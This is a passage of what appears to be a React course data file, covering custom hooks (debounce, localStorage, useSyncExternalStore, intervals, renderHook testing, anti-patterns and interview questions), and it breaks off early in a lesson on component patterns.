          note: `<p>Points interviewers look for: the <b>lazy initialiser</b> (<code>useState(() =&gt; ...)</code>) so storage is read once; <b>both</b> read and write wrapped in <code>try/catch</code>; the <b>stable setter</b> via <code>useCallback</code> so callers can put it in dependency arrays; the <code>typeof next === 'function'</code> check mirroring <code>useState</code>'s updater form. Caveats: if <code>T</code> is itself a function type the updater check is ambiguous (do not store functions); <code>JSON.parse(raw) as T</code> is a trust-me cast, so validate with Zod (Day 9) for anything that matters; and with server rendering the server renders <code>initialValue</code> while the client's lazy initialiser reads storage, causing a <b>hydration mismatch</b>. Example 4's <code>useSyncExternalStore</code> version handles that properly.</p>`
        },
        {
          t: "4. useOnlineStatus and useMediaQuery with useSyncExternalStore",
          lang: "tsx",
          code: `// src/hooks/useOnlineStatus.ts
import { useCallback, useSyncExternalStore } from 'react';

// subscribe is defined at module scope, so it is the same function every render
// and React does not resubscribe.
function subscribeOnline(onChange: () => void) {
  window.addEventListener('online', onChange);
  window.addEventListener('offline', onChange);
  return () => {
    window.removeEventListener('online', onChange);
    window.removeEventListener('offline', onChange);
  };
}

export function useOnlineStatus(): boolean {
  return useSyncExternalStore(
    subscribeOnline,
    () => navigator.onLine, // getSnapshot: must return the same value if nothing changed
    () => true,             // getServerSnapshot: used during SSR and hydration
  );
}

// src/hooks/useMediaQuery.ts
export function useMediaQuery(query: string, serverDefault = false): boolean {
  const subscribe = useCallback(
    (onChange: () => void) => {
      const mql = window.matchMedia(query);
      mql.addEventListener('change', onChange);
      return () => mql.removeEventListener('change', onChange);
    },
    [query], // resubscribe only when the query string changes
  );
  return useSyncExternalStore(
    subscribe,
    () => window.matchMedia(query).matches,
    () => serverDefault,
  );
}

// Usage
export function SaveButton() {
  const isOnline = useOnlineStatus();
  const isNarrow = useMediaQuery('(max-width: 640px)');
  return (
    <button disabled={!isOnline}>
      {isOnline ? (isNarrow ? 'Save' : 'Save changes') : 'Reconnecting…'}
    </button>
  );
}`,
          out: `DevTools → Network → "Offline": the button immediately shows "Reconnecting…" and is disabled.
Resize below 640px: label switches to "Save". Every component using these hooks stays in sync.`,
          note: `<p>Why not <code>useState(navigator.onLine)</code> + <code>useEffect</code>? That version renders once with a possibly stale value, can miss an event fired between render and effect, and can <b>tear</b> during concurrent rendering (two components showing different values in one frame). <code>useSyncExternalStore</code> reads the snapshot during render, re-checks it before commit, and forces a synchronous re-render if it changed. The one hard rule: <code>getSnapshot</code> must return a cached/immutable value; returning a new object every call (<code>() =&gt; ({ online: navigator.onLine })</code>) causes an infinite loop error.</p>`
        },
        {
          t: "5. useInterval: the latest-callback ref pattern",
          lang: "tsx",
          code: `// src/hooks/useInterval.ts
import { useEffect, useLayoutEffect, useRef, useState } from 'react';

export function useInterval(callback: () => void, delayMs: number | null) {
  const savedCallback = useRef(callback);

  // Keep the ref pointing at the latest callback (fresh props/state) after every commit.
  // Writing a ref during render is not allowed, so do it in a layout effect.
  useLayoutEffect(() => {
    savedCallback.current = callback;
  });

  // The interval itself depends only on the delay. null pauses it.
  useEffect(() => {
    if (delayMs === null) return;
    const id = setInterval(() => savedCallback.current(), delayMs);
    return () => clearInterval(id);
  }, [delayMs]);
}

// BROKEN version for comparison: stale closure
export function StaleCounter() {
  const [count, setCount] = useState(0);
  useEffect(() => {
    const id = setInterval(() => setCount(count + 1), 1000); // count is always 0 here
    return () => clearInterval(id);
  }, []); // eslint exhaustive-deps warns: missing 'count'
  return <p>{count}</p>; // stuck at 1
}

// Correct, and the step can change without restarting the timer
export function Counter() {
  const [count, setCount] = useState(0);
  const [step, setStep] = useState(1);
  const [running, setRunning] = useState(true);

  useInterval(() => setCount((c) => c + step), running ? 1000 : null);

  return (
    <div>
      <p>{count}</p>
      <button onClick={() => setStep((s) => s + 1)}>step: {step}</button>
      <button onClick={() => setRunning((r) => !r)}>{running ? 'Pause' : 'Resume'}</button>
    </div>
  );
}`,
          out: `StaleCounter: 0 → 1 → 1 → 1 … (every tick computes 0 + 1)
Counter:      0 → 1 → 2 → (click step) → 4 → 6 … ; Pause stops ticks, Resume restarts`,
          note: `<p>Two separate concerns: <b>when</b> to tick (the effect, keyed by <code>delayMs</code>) and <b>what</b> to run (the ref, always current). Putting <code>callback</code> in the effect's deps would also be correct, but since callers pass a new arrow every render, the interval would be cleared and restarted after every render and could drift or never fire under frequent re-renders. React 19.2 added <code>useEffectEvent</code> to express exactly this "latest callback, not reactive" idea; if your React version has it, it replaces the ref, but the ref pattern works everywhere and is what interviewers expect you to derive.</p>`
        },
        {
          t: "6. Hooks share logic, not state (and how to actually share state)",
          lang: "tsx",
          code: `import { useState, useSyncExternalStore } from 'react';

export function useCounter(initial = 0) {
  const [count, setCount] = useState(initial);
  const increment = () => setCount((c) => c + 1);
  return { count, increment };
}

function A() { const { count, increment } = useCounter(); return <button onClick={increment}>A: {count}</button>; }
function B() { const { count, increment } = useCounter(); return <button onClick={increment}>B: {count}</button>; }
// Clicking A three times → "A: 3", "B: 0". Two components, two fibers, two hook lists.

// To share, keep the state OUTSIDE components and subscribe:
let sharedCount = 0;
const listeners = new Set<() => void>();
const counterStore = {
  increment() { sharedCount += 1; listeners.forEach((l) => l()); },
  subscribe(l: () => void) { listeners.add(l); return () => { listeners.delete(l); }; },
  getSnapshot() { return sharedCount; },
};

export function useSharedCounter() {
  const count = useSyncExternalStore(counterStore.subscribe, counterStore.getSnapshot);
  return { count, increment: counterStore.increment };
}
// Now every component calling useSharedCounter() sees the same number.
// This tiny store is essentially what Zustand does for you (Day 6).`,
          out: `useCounter in A and B → independent: A: 3, B: 0
useSharedCounter in A and B → shared:  A: 3, B: 3`
        },
        {
          t: "7. Return shapes and generic typing",
          lang: "tsx",
          code: `import { useCallback, useState } from 'react';

// Tuple: two values the caller will rename. 'as const' keeps it a tuple.
export function useToggle(initial = false) {
  const [on, setOn] = useState(initial);
  const toggle = useCallback(() => setOn((v) => !v), []);
  return [on, toggle] as const; // readonly [boolean, () => void]
}
// const [isOpen, toggleOpen] = useToggle();
// Without 'as const' the type is (boolean | (() => void))[], and isOpen() would type-check!

// Object: several values, callers pick what they need, easy to extend later.
type Status = 'idle' | 'pending' | 'success' | 'error';

export function useAsync<TArgs extends unknown[], TResult>(fn: (...args: TArgs) => Promise<TResult>) {
  const [status, setStatus] = useState<Status>('idle');
  const [data, setData] = useState<TResult | undefined>(undefined);
  const [error, setError] = useState<unknown>(null);

  const run = useCallback(async (...args: TArgs) => {
    setStatus('pending');
    setError(null);
    try {
      const result = await fn(...args);
      setData(result);
      setStatus('success');
      return result;
    } catch (e) {
      setError(e);
      setStatus('error');
      throw e; // let the caller decide too
    }
  }, [fn]);

  return { status, data, error, run, isPending: status === 'pending' };
}

// Usage: TArgs and TResult are inferred from the function you pass.
async function deleteUser(id: number): Promise<{ deleted: boolean }> {
  const res = await fetch('/api/users/' + id, { method: 'DELETE' });
  if (!res.ok) throw new Error('Delete failed');
  return res.json();
}
export function DeleteButton({ id }: { id: number }) {
  const { run, isPending, error } = useAsync(deleteUser); // run: (id: number) => Promise<{deleted: boolean}>
  return (
    <>
      <button disabled={isPending} onClick={() => run(id).catch(() => {})}>Delete</button>
      {error != null && <p role="alert">Could not delete</p>}
    </>
  );
}`,
          note: `<p><code>deleteUser</code> is declared at module scope so <code>fn</code> is stable and <code>run</code> is not recreated each render. If a caller passes an inline arrow, <code>run</code> changes every render; document that, or store <code>fn</code> in a latest-ref like <code>useInterval</code>. For server data in a real app, prefer TanStack Query's <code>useMutation</code> (Day 7): it already handles this, plus retries and cache invalidation. <code>useAsync</code> is here to show typing, not to replace it.</p>`
        },
        {
          t: "8. Testing hooks with renderHook (Vitest + Testing Library)",
          lang: "tsx",
          code: `// src/hooks/useDebounce.test.ts
import { act, renderHook } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { useDebounce } from './useDebounce';
import { useLocalStorage } from './useLocalStorage';

describe('useDebounce', () => {
  beforeEach(() => { vi.useFakeTimers(); });
  afterEach(() => { vi.useRealTimers(); });

  it('only updates after the value stops changing', () => {
    const { result, rerender } = renderHook(
      ({ value }) => useDebounce(value, 300),
      { initialProps: { value: 'a' } },
    );
    expect(result.current).toBe('a');

    rerender({ value: 'ab' });
    act(() => { vi.advanceTimersByTime(200); });
    rerender({ value: 'abc' });              // restarts the timer
    act(() => { vi.advanceTimersByTime(200); });
    expect(result.current).toBe('a');         // 400 ms total, but only 200 since last change

    act(() => { vi.advanceTimersByTime(100); });
    expect(result.current).toBe('abc');
  });
});

describe('useLocalStorage', () => {
  beforeEach(() => { localStorage.clear(); });

  it('falls back to the initial value when stored JSON is corrupt', () => {
    localStorage.setItem('prefs', '{not json');
    const { result } = renderHook(() => useLocalStorage('prefs', { compact: false }));
    expect(result.current[0]).toEqual({ compact: false });
  });

  it('persists updates', () => {
    const { result } = renderHook(() => useLocalStorage('count', 0));
    act(() => { result.current[1]((c) => c + 1); });
    expect(result.current[0]).toBe(1);
    expect(localStorage.getItem('count')).toBe('1');
  });
});`,
          out: `$ npx vitest run src/hooks
 ✓ src/hooks/useDebounce.test.ts (3 tests)
 Test Files  1 passed (1)`,
          note: `<p>Setup: <code>npm install -D vitest @testing-library/react @testing-library/dom jsdom</code> and set <code>test: { environment: 'jsdom' }</code> in <code>vite.config.ts</code> (Day 14 covers the full setup). Read <code>result.current</code> <i>after</i> each <code>act</code>: it is a live getter, so destructuring it once at the top gives you a stale snapshot, the same snapshot lesson as Day 3.</p>`
        },
        {
          t: "9. Anti-patterns: useMount wrappers and hooks that hide effects",
          lang: "tsx",
          code: `import { useEffect } from 'react';

// ANTI-PATTERN 1: lifecycle wrappers
// eslint-disable-next-line react-hooks/exhaustive-deps
export function useMount(fn: () => void) { useEffect(() => { fn(); }, []); }

function Profile({ userId }: { userId: number }) {
  useMount(() => { loadProfile(userId); });
  // Lint can no longer see that userId is used. When userId changes (navigating
  // /users/1 → /users/2 keeps this component mounted), the profile never reloads.
  return null;
}
// Better: say what you synchronise with, and let the linter check deps.
function ProfileFixed({ userId }: { userId: number }) {
  useEffect(() => { loadProfile(userId); }, [userId]);
  return null;
}

// ANTI-PATTERN 2: a hook named like a getter that quietly performs side effects
export function useCurrentUser() {
  useEffect(() => {
    fetch('/api/me').then((r) => r.json()).then((u) => { analytics.identify(u.id); });
  }, []);
  // ...every component that calls useCurrentUser() fires its own GET /api/me
  // and its own analytics call. 20 components = 20 requests.
}
// Better: one source of truth with deduplication (TanStack Query), and side effects
// placed explicitly where they belong (one place in the app shell).

// ANTI-PATTERN 3: 'use' prefix on a function that calls no hooks
export function useFormatPrice(cents: number) { return (cents / 100).toFixed(2); }
// Now it can't be called in a loop or condition without lint errors. Name it formatPrice.

declare function loadProfile(id: number): void;
declare const analytics: { identify(id: number): void };`,
          note: `<p>The test for a good custom hook: does its name describe a <b>purpose</b> (<code>useOnlineStatus</code>, <code>useChatRoom(roomId)</code>) rather than a <b>lifecycle</b> (<code>useMount</code>, <code>useUpdateEffect</code>)? Lifecycle-shaped hooks recreate class-component thinking and defeat the dependency linter. The React docs make the same point: keep custom hooks focused on concrete, high-level use cases.</p>`
        }
      ],
      internals: `<p><b>Where hooks live.</b> Each component instance has a fiber. For function components, <code>fiber.memoizedState</code> points to the first hook object; each hook object has roughly <code>{ memoizedState, baseState, baseQueue, queue, next }</code>. <code>useState</code>/<code>useReducer</code> keep the current value in <code>memoizedState</code> and pending updates in <code>queue</code>; <code>useEffect</code>/<code>useLayoutEffect</code> store an effect object (create function, destroy function, deps) and also push it onto the fiber's effect list so the commit phase knows what to run; <code>useRef</code> stores <code>{ current }</code>; <code>useMemo</code>/<code>useCallback</code> store <code>[value, deps]</code>.</p>
<p><b>Dispatchers.</b> React does not have one implementation of <code>useState</code>. Before calling your component, <code>renderWithHooks</code> sets a module-level "current dispatcher": <code>HooksDispatcherOnMount</code> on the first render (each hook call creates a new hook object via <code>mountWorkInProgressHook</code> and appends it) or <code>HooksDispatcherOnUpdate</code> on re-renders (each call advances a cursor via <code>updateWorkInProgressHook</code>, cloning the next hook from the current tree). The exported <code>useState</code> just forwards to whichever dispatcher is active. That is why calling a hook outside a component fails with "Invalid hook call": the dispatcher is a "throw on call" stub when no component is rendering. (Having two copies of React in the bundle produces the same error, since your component imports one copy's dispatcher while the other copy is rendering.)</p>
<p><b>How order errors are detected.</b> On update, if your component calls a hook but the current list has no next node, React throws "Rendered more hooks than during the previous render." If rendering finishes with nodes left over, it throws "Rendered fewer hooks than expected. This may be caused by an accidental early return statement." In development React also records the <i>name</i> of each hook in call order and logs "React has detected a change in the order of Hooks called by Component" if, say, position 2 was <code>useState</code> last time and is <code>useEffect</code> now. None of these run in production builds except the count checks, so a same-count reorder in production silently corrupts state.</p>
<p><b>Custom hooks at runtime.</b> A custom hook is invisible to the reconciler: it is a normal JS call on the component's stack. Its inner hooks become nodes in the caller's list. DevTools reconstructs the "custom hook" grouping you see in the Components panel by re-running the component with a special inspecting dispatcher and parsing stack traces, which is why <code>useDebugValue</code> exists to label custom hooks there.</p>
<p><b><code>useSyncExternalStore</code> internals.</b> During render it calls <code>getSnapshot()</code> and stores the value; in development it calls it twice and errors if the results are not <code>Object.is</code>-equal (the "getSnapshot should be cached" warning). After commit it subscribes; when the store calls back, React compares the new snapshot with the stored one and schedules a <b>synchronous</b> (non-concurrent) update if it changed. It also re-checks the snapshot just before committing a concurrent render, which is how it prevents tearing. During hydration it uses <code>getServerSnapshot</code> so the first client render matches the server HTML, then re-renders with the real value.</p>
<p><b>Effects and cleanup order.</b> For <code>useDebounce</code>, every committed render where <code>value</code> changed runs the previous effect's cleanup (<code>clearTimeout</code>) then the new effect. In StrictMode development builds React mounts, runs cleanups, and re-runs effects once on mount (Day 5), which is a free test that your hook cleans up properly.</p>`,
      prod: `<p><b>Where custom hooks live in a React + FastAPI app.</b> A typical feature-folder layout (Day 15) has generic hooks in <code>src/hooks/</code> (<code>useDebounce</code>, <code>useLocalStorage</code>, <code>useMediaQuery</code>, <code>useOnlineStatus</code>) and feature hooks next to the feature (<code>src/features/orders/useOrders.ts</code>, <code>useCreateOrder.ts</code>) that wrap TanStack Query calls to <code>/api/orders</code> with the right query keys, Zod parsing and error mapping. Components then read like a specification: <code>const { data: orders, isPending } = useOrders(filters)</code>. When FastAPI changes a response shape, one hook changes, not twenty components.</p>
<p><b>What goes wrong at scale.</b></p>
<ul class="pts">
<li><b>Request storms from hooks that hide effects.</b> A <code>usePermissions()</code> that fetches in a <code>useEffect</code> gets called by 40 buttons on a dashboard; FastAPI sees 40 identical requests per page view and Redis absorbs the stampede only if you cache that endpoint. Fix: data hooks are thin wrappers over TanStack Query, which deduplicates by key.</li>
<li><b>Debounce in the wrong place.</b> Debouncing the <i>input value</i> (making typing laggy) instead of the <i>query</i>. Or debouncing in the component but not keying the query by the debounced value, so the old request's response overwrites the new one. Query keys plus <code>AbortSignal</code> solve both.</li>
<li><b>localStorage as a database.</b> Storing whole API responses in <code>useLocalStorage</code> leads to stale data after deploys, schema drift (yesterday's JSON shape crashes today's code: validate with Zod and version your keys, e.g. <code>'prefs:v2'</code>), and 5 MB quota errors. Persist only small user preferences; persisted server cache belongs to TanStack Query's persister if anywhere.</li>
<li><b>Hydration mismatches</b> in SSR apps (Day 13) from hooks that read <code>window</code>, <code>localStorage</code> or <code>matchMedia</code> during the first render. <code>useSyncExternalStore</code> with a <code>getServerSnapshot</code> is the principled fix.</li>
<li><b>Disabled lint rules.</b> Every <code>// eslint-disable-next-line react-hooks/exhaustive-deps</code> is a potential stale-closure bug. Teams that care count them in CI and require a comment explaining why. Treat <code>rules-of-hooks</code> violations as build-breaking.</li>
<li><b>Unstable return values.</b> A shared hook that returns a new object or function each render makes every consumer's <code>useEffect</code>/<code>useMemo</code> re-run. Library-grade hooks return stable callbacks (<code>useCallback</code>) and memoised objects; with the React Compiler (Day 11) much of this becomes automatic, but only for code that follows the rules of React.</li>
</ul>
<p><b>Lead-level conventions:</b> one hook per file, named export, co-located test; generic hooks have zero app imports (so they could move to a shared package); feature hooks own their query keys; no hook does both data fetching and analytics; <code>useDebugValue</code> on hooks that are hard to inspect in DevTools.</p>`,
      iq: [
        ["fresher", "What are the rules of hooks?", `<p>Call hooks only at the <b>top level</b> of a function component or custom hook (not in conditions, loops, nested functions or after an early return), and call them only from <b>React functions</b> (components and custom hooks), not regular functions or classes. The reason: React identifies each hook by its <b>call order</b>, so the order must be the same on every render. A tempting wrong answer is "because hooks are slow" or "because React can't see them otherwise"; the actual reason is the order-based storage on the fiber.</p>`],
        ["fresher", "What is a custom hook and how is it different from a regular function?", `<p>A custom hook is a function whose name starts with <code>use</code> and that calls other hooks. Technically it <i>is</i> a regular function; the difference is that because it calls hooks, it inherits the rules of hooks, and the <code>use</code> prefix tells the linter (and the React Compiler) to check those rules at its call sites. If a function calls no hooks, it should <i>not</i> be named <code>useX</code>.</p>`],
        ["mid", "If two components call the same custom hook, do they share state?", `<p>No. Each call creates its own hook nodes on the calling component's fiber, so each component (and each call within a component) has independent state. Custom hooks share <b>logic</b>, not <b>state</b>. To share state, lift it to a common parent, use context, or keep it in an external store and subscribe with <code>useSyncExternalStore</code> (what Zustand/Redux do). Candidates sometimes assume a hook is like a singleton module; it is not.</p>`],
        ["mid", "Why does this effect keep logging 0: <code>useEffect(() =&gt; { const id = setInterval(() =&gt; console.log(count), 1000); return () =&gt; clearInterval(id); }, [])</code>?", `<p>The interval callback closes over <code>count</code> from the first render (a <b>stale closure</b>), and the empty deps mean the effect never re-runs to capture a newer one. Fixes: use the updater form for state updates (<code>setCount(c =&gt; c + 1)</code>); add <code>count</code> to deps (restarts the interval each change); or store the latest callback in a ref and call <code>ref.current()</code> from a stable interval (the <code>useInterval</code> pattern, or <code>useEffectEvent</code> where available in React 19.2+). Simply silencing the exhaustive-deps warning is the wrong answer.</p>`],
        ["mid", "Write <code>useDebounce</code>. What happens if you forget the cleanup?", `<p><code>const [d, setD] = useState(value); useEffect(() =&gt; { const id = setTimeout(() =&gt; setD(value), delay); return () =&gt; clearTimeout(id); }, [value, delay]); return d;</code></p><p>Without the cleanup every keystroke schedules its own timer and none are cancelled, so the value updates once per keystroke, just delayed: it becomes a <i>delay</i>, not a debounce, and fires N requests. It may also call <code>setD</code> after unmount (harmless in React 18+, but wasted work).</p>`],
        ["mid", "When would you return a tuple vs an object from a custom hook?", `<p>Tuple (<code>[value, setValue] as const</code>) when there are one or two values the caller will want to rename, like <code>useState</code>; it reads nicely when used several times in one component. Object when there are three or more values, callers want only some of them, or the API may grow (adding a field to an object is non-breaking; inserting into a tuple shifts positions). In TypeScript, forgetting <code>as const</code> turns the tuple into a union array and loses per-position types.</p>`],
        ["senior", "Why should <code>useOnlineStatus</code> use <code>useSyncExternalStore</code> instead of <code>useState</code> + <code>useEffect</code>?", `<p>The external value can change outside React at any time. With <code>useState</code> + <code>useEffect</code>: the first render uses an initial guess, events between render and subscription are missed unless you re-read on subscribe, and in concurrent rendering two components can read different values during one render (<b>tearing</b>). <code>useSyncExternalStore</code> reads the snapshot during render, re-validates before commit, re-renders synchronously on change, and supports <code>getServerSnapshot</code> for SSR/hydration. Requirements: <code>subscribe</code> should be stable (module scope or <code>useCallback</code>), and <code>getSnapshot</code> must return the same value when nothing changed, or React loops.</p>`],
        ["senior", "How does React know which <code>useState</code> call is which? What actually breaks with a conditional hook?", `<p>Hooks are stored as a linked list on the fiber (<code>fiber.memoizedState</code>). On mount each call appends a node; on update a cursor walks the list in order and each call takes the next node. No names or keys are involved. A conditional call shifts every later call onto the wrong node; if counts differ React throws ("Rendered more/fewer hooks"), and in dev it warns when the hook kind at a position changes. If kinds and counts happen to line up, state silently swaps between variables in production. The tempting wrong answer is "React uses the variable name"; it cannot, since names do not exist at runtime after minification.</p>`],
        ["senior", "Your <code>useLocalStorage</code> hook causes a hydration mismatch in a Next.js app. Why, and how do you fix it?", `<p>On the server there is no <code>localStorage</code>, so it renders <code>initialValue</code>; on the client the lazy initialiser reads the stored value and the first client render differs from the server HTML. Fixes: (1) use <code>useSyncExternalStore</code> with <code>getServerSnapshot</code> returning the default, so hydration renders the default and React then re-renders with the stored value; (2) render the default until a mounted flag flips in an effect (simpler, one extra render); (3) for things like theme, store the preference in a cookie that the server can read, so server and client agree from the start. Wrapping in <code>typeof window</code> alone does <i>not</i> fix it: it only avoids the crash.</p>`],
        ["lead", "What custom-hook conventions would you set for a team?", `<p>Name hooks by purpose not lifecycle (no <code>useMount</code>/<code>useDidUpdate</code>); <code>rules-of-hooks</code> as an error in CI and disabled <code>exhaustive-deps</code> lines require a justification; one hook per file with a co-located <code>renderHook</code> test; generic hooks have no app imports; server data goes through TanStack Query wrappers (<code>useOrders</code>) that own their query keys, never a bespoke <code>useFetch</code> per feature; hooks return stable callbacks; no hidden side effects such as analytics or global writes inside data hooks; prefer an object return once there are more than two values. These keep hooks predictable and compiler-friendly.</p>`],
        ["architect", "How would you design a shared hooks package used by several React apps in your organisation?", `<p>Publish it as an internal package (or a workspace in a monorepo) with React as a <b>peer dependency</b>, never a direct dependency, to avoid two copies of React ("Invalid hook call"). Keep it SSR-safe (no top-level <code>window</code> access, <code>getServerSnapshot</code> everywhere), tree-shakeable (ESM, side-effect-free, one export per hook), typed with generics, and versioned with semver and a changelog since a changed return shape is a breaking change. Test with <code>renderHook</code> and in at least one SSR environment. Keep it free of app concerns (no API base URLs, no auth); domain hooks wrapping the FastAPI client belong to each app or to a separate generated-client package. Measure adoption and avoid it becoming a dumping ground: if a hook is used once, it stays in the app.</p>`]
      ],
      gotchas: [
        `<b>Early returns count as conditional hooks.</b> <code>if (!data) return &lt;Spinner /&gt;;</code> above a <code>useMemo</code> is the most common violation in real code. Move all hooks above the first <code>return</code>.`,
        `<b>Hooks in callbacks are invalid even if they look "top level".</b> <code>items.map(item =&gt; useItemState(item))</code> violates the rules (loop). Extract an <code>&lt;Item /&gt;</code> component that calls the hook instead.`,
        `<b><code>use</code> is the exception, but only <code>use</code>.</b> React 19's <code>use(promise)</code>/<code>use(Context)</code> can be called conditionally; <code>useContext</code> cannot. Neither works inside <code>try/catch</code> for catching suspension; use Suspense and error boundaries.`,
        `<b>The <code>storage</code> event does not fire in the tab that made the change.</b> Two components in the same tab using <code>useLocalStorage('theme')</code> do not see each other's updates unless you add your own in-tab notification (custom event or a store with <code>useSyncExternalStore</code>).`,
        `<b><code>getSnapshot</code> must be cached.</b> <code>() =&gt; JSON.parse(localStorage.getItem(k)!)</code> returns a new object every call; React detects the inequality and throws "The result of getSnapshot should be cached". Return the raw string and parse with <code>useMemo</code>, or cache by raw value.`,
        `<b>Object/array arguments restart effects.</b> <code>useDebounce({ q, page })</code> with an inline object makes <code>value</code> a new reference every render, so the timer never settles. Debounce primitives, or memoise the object.`,
        `<b><code>result.current</code> is a getter.</b> In <code>renderHook</code> tests, <code>const [v, set] = result.current</code> captured once becomes stale after <code>act</code>; re-read <code>result.current</code> after each update.`,
        `<b>Two copies of React</b> (a linked package, a library bundling its own React) produce "Invalid hook call" even when your code follows every rule. Check with <code>npm ls react</code>; libraries must list React as a peer dependency.`,
        `<b>A hook that conditionally calls a different custom hook</b> (<code>const data = isAdmin ? useAdminData() : useUserData()</code>) violates the rules even if both have identical internals today; tomorrow one gains a <code>useEffect</code>. Call both and pick, or split components.`
      ],
      best: [
        `Keep <code>react-hooks/rules-of-hooks</code> as an error and <code>exhaustive-deps</code> on; fix the code instead of disabling the rule, and require a written reason for every disable.`,
        `Extract a custom hook when logic is reused <i>or</i> when it hides "how" behind a well-named "what". Name it after the purpose: <code>useOnlineStatus</code>, not <code>useWindowEventEffect</code>.`,
        `Use <code>useSyncExternalStore</code> for any value that lives outside React (browser APIs, third-party stores), with a stable <code>subscribe</code> and a cached <code>getSnapshot</code>, and provide <code>getServerSnapshot</code> if you might ever SSR.`,
        `Return stable functions from shared hooks (<code>useCallback</code> or the latest-ref pattern) so callers can safely list them as dependencies.`,
        `Type hooks with generics inferred from arguments, return tuples <code>as const</code>, and validate anything read from storage or the network instead of casting.`,
        `Do not hand-roll data fetching hooks for server state; wrap TanStack Query per feature. Reserve custom effect-based hooks for genuinely client-side concerns.`,
        `Test each shared hook with <code>renderHook</code> + fake timers, including cleanup on unmount and the error paths (corrupt JSON, blocked storage).`
      ],
      lab: [
        `In your Vite app create <code>src/hooks/</code>. Write <code>useDebounce&lt;T&gt;</code> from memory and wire it into a search input that calls <code>/api/users?q=</code> on your FastAPI backend (or a mock). Watch the Network tab while typing quickly.`,
        `Remove the cleanup line from <code>useDebounce</code>, type again, and count the requests. Restore it. Then deliberately move a <code>useState</code> below an early <code>return</code> in some component and read the ESLint error and the runtime error.`,
        `Write <code>useLocalStorage&lt;T&gt;</code> with lazy init, <code>try/catch</code> on parse and write, and the <code>storage</code> listener. Use it for a theme toggle. Open the app in two tabs and toggle in one. Then put <code>{not json</code> into the key via DevTools → Application and reload: the app must not crash.`,
        `Write <code>useOnlineStatus</code> and <code>useMediaQuery</code> with <code>useSyncExternalStore</code>. Show a banner when offline (DevTools → Network → Offline) and switch a layout below 640px.`,
        `Write <code>useInterval</code> with the latest-callback ref and build the counter with a variable step and pause. Then add a <code>console.log</code> in the interval effect to prove it does <i>not</i> re-run when <code>step</code> changes.`,
        `Install Vitest and Testing Library, and write <code>renderHook</code> tests for <code>useDebounce</code> (fake timers) and <code>useLocalStorage</code> (corrupt JSON fallback, persistence).`,
        `<b>Done when:</b> typing a word sends one request; corrupt storage does not crash the app; the offline banner and media query react instantly; the interval effect logs only when the delay changes; and <code>npx vitest run</code> passes with zero <code>rules-of-hooks</code> lint errors.`
      ],
      teach: `<p>"Hooks look like magic, but they are just a list. Every time React renders a component, it walks through the hooks you call, in order, and hands each one the next slot from a list stored on that component's fiber. That is why the rules of hooks exist: no conditions, loops or early returns before a hook, because skipping one shifts every later hook to the wrong slot. The ESLint plugin enforces it, so treat its errors as real bugs.</p>
<p>A custom hook is just a function named <code>useSomething</code> that calls hooks. It lets you pull logic out of a component and give it a name: <code>useDebounce</code>, <code>useLocalStorage</code>, <code>useOnlineStatus</code>. Crucially, it shares <i>logic</i>, not <i>state</i>: two components calling the same hook get their own copies. If you want shared state, lift it up, use context, or an external store.</p>
<p>A few patterns to know cold: debounce with an effect whose cleanup clears the timer; local storage with a lazy initialiser and <code>try/catch</code>; browser values like online status through <code>useSyncExternalStore</code>; and intervals that keep the latest callback in a ref so they don't reset every render. Return a tuple for value-and-setter, an object for anything bigger, type it with generics, and test it with <code>renderHook</code>. And avoid hooks named after lifecycles like <code>useMount</code>: name them after what they do."</p>`
    },
    /* ------------------------------------------------------------------ */
    {
      id: "d10-patterns",
      title: "Component patterns: compound, headless, render props and error boundaries",
      lv: ["mid", "senior", "lead", "architect"],
      eli5: `<p>Think of a <b>LEGO set</b> versus a <b>finished toy</b>. A finished toy car does one thing; if you want it blue instead of red, too bad. A LEGO set gives you pieces that click together, so you can build the car the way you like. React component patterns are about building LEGO pieces, not finished toys: components that other developers can combine and customise without opening them up and editing them.</p>
<p>A <b>compound component</b> is like a TV remote and its TV: separate pieces (<code>&lt;Tabs&gt;</code>, <code>&lt;Tabs.Tab&gt;</code>, <code>&lt;Tabs.Panel&gt;</code>) that quietly talk to each other, so you can arrange the buttons wherever you like and they still control the same screen. A <b>headless</b> component is a car engine without a body: it does all the hard work (opening, closing, keyboard support, accessibility) and you bolt on whatever body (markup and styles) you want.</p>
<p>An <b>error boundary</b> is a circuit breaker in your house. When one appliance shorts out, the breaker for that room trips, and the rest of the house keeps its lights on. Without it, one broken widget would blank the whole page. But a circuit breaker only watches the wiring: it does not notice if someone drops a plate in the kitchen. Likewise, error boundaries only catch errors that happen while React is <i>drawing</i> the screen, not errors in click handlers or timers.</p>`,
      what: `<p>Component patterns are conventions for designing a component's <b>API</b>: how other developers pass data in, customise rendering, receive events, and recover from failure. Most of them are built from a few React primitives: props, <code>children</code>, context, hooks and, for error boundaries, one class component API.</p>
<h5>Composition over inheritance</h5>
<p>React components never extend each other. You specialise by <b>wrapping</b> (<code>DangerButton</code> renders <code>&lt;Button variant="danger" /&gt;</code>) and you customise by <b>passing things in</b>: <code>children</code>, other props that take <code>ReactNode</code> ("slots"), or functions. The React team has long said they found no use case at Facebook that needed component inheritance hierarchies. Shared non-UI logic goes into hooks or plain modules.</p>
<h5>Compound components</h5>
<ul class="pts">
<li>A parent (<code>&lt;Tabs&gt;</code>) owns the state and exposes it through <b>context</b>; children (<code>&lt;Tabs.List&gt;</code>, <code>&lt;Tabs.Tab&gt;</code>, <code>&lt;Tabs.Panel&gt;</code>) read it. The consumer controls structure and order; the components control behaviour.</li>
<li>Context, not <code>React.Children.map</code> + <code>cloneElement</code>: the old cloning approach breaks as soon as a consumer wraps a tab in a <code>&lt;div&gt;</code> or a custom component, because it only sees direct children. Context works at any depth.</li>
<li>Each sub-component calls a guard hook (<code>useTabsContext()</code>) that throws a helpful error if used outside the parent.</li>
<li>Typical examples: Tabs, Accordion, Menu/Dropdown, Select, RadioGroup, Dialog (<code>Dialog.Trigger</code>, <code>Dialog.Content</code>). Radix UI and React Aria Components are built this way.</li>
</ul>
<h5>Controlled vs uncontrolled component APIs</h5>
<p>The same distinction as inputs (Day 3), applied to your own components. <b>Uncontrolled</b>: the component owns its state and the caller sets only the starting point (<code>defaultValue</code>, <code>defaultOpen</code>). <b>Controlled</b>: the caller owns the state and passes <code>value</code> + <code>onValueChange</code> (or <code>open</code> + <code>onOpenChange</code>); the component never changes it on its own. Good reusable components support both and pick the mode by whether <code>value</code> is <code>undefined</code>, usually via a small <code>useControllableState</code> hook. A component must not switch modes during its lifetime; React warns about exactly this for native inputs ("changing an uncontrolled input to be controlled").</p>
<h5>Headless components and hooks</h5>
